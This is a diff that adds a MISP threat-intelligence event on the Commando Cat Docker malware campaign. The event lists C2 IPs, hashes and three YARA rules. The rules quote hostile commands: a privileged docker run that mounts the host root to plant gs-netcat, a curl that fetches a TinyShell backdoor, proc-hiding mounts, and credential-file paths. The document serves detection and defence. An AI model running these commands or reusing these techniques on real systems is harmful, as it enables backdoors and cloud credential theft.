@@ -1,0 +1,105 @@
+{
+    "Event":{
+        "threat_level_id":"2",
+        "date":"2024-02-01",
+        "published":true,
+        "info":"The Nine Lives of Commando Cat: Analysing a Novel Malware Campaign Targeting Docker",
+        "publish_timestamp":"1707292706",
+        "timestamp":"1707292703",
+        "Tag":[
+            {
+                "name":"tlp:white"
+            }
+        ],
+        "Attribute":[
+            {
+                "category":"External analysis",
+                "comment":"",
+                "timestamp":"1707249242",
+                "type":"link",
+                "value":"https://www.cadosecurity.com/the-nine-lives-of-commando-cat-analysing-a-novel-malware-campaign-targeting-docker/",
+                "to_ids":false
+            },
+            {
+                "category":"Other",
+                "comment":"",
+                "timestamp":"1707249319",
+                "type":"comment",
+                "value":"The payloads are delivered to exposed Docker API instances over the Internet by the IP 45[.]9.148.193 (which is the same as C2). The attacker instructs Docker to pull down a Docker image called cmd.cat/chattr. The cmd.cat (also known as Commando) project",
+                "to_ids":false
+            },
+            {
+                "category":"Payload delivery",
+                "comment":"",
+                "timestamp":"1707249353",
+                "type":"md5",
+                "value":"<md5>",
+                "to_ids":true
+            },
+            {
+                "category":"Payload delivery",
+                "comment":"",
+                "timestamp":"1707249353",
+                "type":"md5",
+                "value":"<md5>",
+                "to_ids":true
+            },
+            {
+                "category":"Payload delivery",
+                "comment":"",
+                "timestamp":"1707249353",
+                "type":"md5",
+                "value":"<md5>",
+                "to_ids":true
+            },
+            {
+                "category":"Payload delivery",
+                "comment":"",
+                "timestamp":"1707249353",
+                "type":"md5",
+                "value":"<md5>",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"C2",
+                "timestamp":"1707249387",
+                "type":"ip-dst",
+                "value":"45.9.148.193",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"",
+                "timestamp":"1707249387",
+                "type":"ip-dst",
+                "value":"103.127.43.208",
+                "to_ids":true
+            },
+            {
+                "category":"Payload installation",
+                "comment":"",
+                "timestamp":"1707249404",
+                "type":"yara",
+                "value":"rule Stealer_Linux_CommandoCat {\r\n\tmeta:\r\n        description = \"Detects CommandoCat aws.sh credential stealer script\"\r\n        license = \"Apache License 2.0\"\r\n        date = \"2024-01-25\"\r\n        hash1 = \"185564f59b6c849a847b4aa40acd9969253124f63ba772fc5e3ae9dc2a50eef0\"\r\n    strings:\r\n        // Constants\r\n        $const1 = \"CRED_FILE_NAMES\"\r\n        $const2 = \"MIXED_CREDFILES\"\r\n        $const3 = \"AWS_CREDS_FILES\"\r\n        $const4 = \"GCLOUD_CREDS_FILES\"\r\n        $const5 = \"AZURE_CREDS_FILES\"\r\n        $const6 = \"VICOIP\"\r\n        $const7 = \"VICHOST\"\r\n\r\n        // Functions\r\n        $func1 = \"get_docker()\"\r\n        $func2 = \"cred_files()\"\r\n        $func3 = \"get_azure()\"\r\n        $func4 = \"get_google()\"\r\n        $func5 = \"run_aws_grabber()\"\r\n        $func6 = \"get_aws_infos()\"\r\n        $func7 = \"get_aws_meta()\"\r\n        $func8 = \"get_aws_env()\"\r\n        $func9 = \"get_prov_vars()\"\r\n\r\n        // Log Statements\r\n        $log1 = \"no dubble\"\r\n        $log2 = \"-------- PROC VARS -----------------------------------\"\r\n        $log3 = \"-------- DOCKER CREDS -----------------------------------\"\r\n        $log4 = \"-------- CREDS FILES -----------------------------------\"\r\n        $log5 = \"-------- AZURE DATA --------------------------------------\"\r\n        $log6 = \"-------- GOOGLE DATA --------------------------------------\"\r\n        $log7 = \"AWS_ACCESS_KEY_ID : $AWS_ACCESS_KEY_ID\"\r\n        $log8 = \"AWS_SECRET_ACCESS_KEY : $AWS_SECRET_ACCESS_KEY\"\r\n        $log9 = \"AWS_EC2_METADATA_DISABLED : $AWS_EC2_METADATA_DISABLED\"\r\n        $log10 = \"AWS_ROLE_ARN : $AWS_ROLE_ARN\"\r\n        $log11 = \"AWS_WEB_IDENTITY_TOKEN_FILE: $AWS_WEB_IDENTITY_TOKEN_FILE\"\r\n\r\n        // Paths\r\n        $path1 = \"/root/.docker/config.json\"\r\n        $path2 = \"/home/*/.docker/config.json\"\r\n        $path3 = \"/etc/hostname\"\r\n        $path4 = \"/tmp/..a.$RANDOM\"\r\n        $path5 = \"/tmp/$RANDOM\"\r\n        $path6 = \"/tmp/$RANDOM$RANDOM\"\r\n\r\n    condition:\r\n        filesize < 1MB and\r\n        all of them        \r\n}",
+                "to_ids":false
+            },
+            {
+                "category":"Payload installation",
+                "comment":"",
+                "timestamp":"1707249420",
+                "type":"yara",
+                "value":"rule Backdoor_Linux_CommandoCat {\r\n\tmeta:\r\n        description = \"Detects CommandoCat gsc.sh backdoor registration script\"\r\n        license = \"Apache License 2.0\"\r\n        date = \"2024-01-25\"\r\n        hash1 = \"d083af05de4a45b44f470939bb8e9ccd223e6b8bf4568d9d15edfb3182a7a712\"\r\n    strings:\r\n        // Constants\r\n        $const1 = \"SRCURL\"\r\n        $const2 = \"SETPATH\"\r\n        $const3 = \"SETNAME\"\r\n        $const4 = \"SETSERV\"\r\n        $const5 = \"VICIP\"\r\n        $const6 = \"VICHN\"\r\n        $const7 = \"GSCSTATUS\"\r\n        $const8 = \"VICSYSTEM\"\r\n        $const9 = \"GSCBINURL\"\r\n        $const10 = \"GSCATPID\"\r\n\r\n        // Functions\r\n        $func1 = \"hidfile()\"\r\n\r\n        // Log Statements\r\n        $log1 = \"run gsc ...\"\r\n\r\n        // Paths\r\n        $path1 = \"/dev/shm/.nc.tar.gz\"\r\n        $path2 = \"/etc/hostname\"\r\n        $path3 = \"/bin/gs-netcat\"\r\n        $path4 = \"/etc/systemd/gsc\"\r\n        $path5 = \"/bin/hid\"\r\n\r\n        // General\r\n        $str1 = \"mount --bind /usr/foo /proc/$1\"\r\n        $str2 = \"cp /etc/mtab /usr/t\" \r\n        $str3 = \"docker run -t -v /:/host --privileged cmd.cat/tar tar xzf /host/dev/shm/.nc.tar.gz -C /host/bin gs-netcat\"\r\n\r\n    condition:\r\n        filesize < 1MB and\r\n        all of them        \r\n}",
+                "to_ids":false
+            },
+            {
+                "category":"Payload installation",
+                "comment":"",
+                "timestamp":"1707249437",
+                "type":"yara",
+                "value":"rule Backdoor_Linux_CommandoCat_tshd {\r\n\tmeta:\r\n        description = \"Detects CommandoCat tshd TinyShell registration script\"\r\n        license = \"Apache License 2.0\"\r\n        date = \"2024-01-25\"\r\n        hash1 = \"65c6798eedd33aa36d77432b2ba7ef45dfe760092810b4db487210b19299bdcb\"\r\n    strings:\r\n        // Constants\r\n        $const1 = \"SRCURL\"\r\n        $const2 = \"HOME\"\r\n        $const3 = \"TSHDPID\"\r\n\r\n        // Functions\r\n        $func1 = \"setuptools()\"\r\n        $func2 = \"hidfile()\"\r\n        $func3 = \"hidetshd()\"\r\n\r\n        // Paths\r\n        $path1 = \"/var/tmp\"\r\n        $path2 = \"/bin/hid\"\r\n        $path3 = \"/etc/mtab\"\r\n        $path4 = \"/dev/shm/..tshdpid\"\r\n        $path5 = \"/tmp/.tsh.tar.gz\"\r\n        $path6 = \"/usr/sbin/tshd\"\r\n        $path7 = \"/usr/foo\"\r\n        $path8 = \"./tshd\"\r\n\r\n        // General\r\n        $str1 = \"curl -Lk $SRCURL/bin/tsh/tsh.tar.gz -o /tmp/.tsh.tar.gz\"\r\n        $str2 = \"find /dev/shm/ -type f -size 0 -exec rm -f {} \\\\;\"\r\n\r\n    condition:\r\n        filesize < 1MB and\r\n        all of them        \r\n}",
+                "to_ids":false
+            }
+        ]
+    }
+}
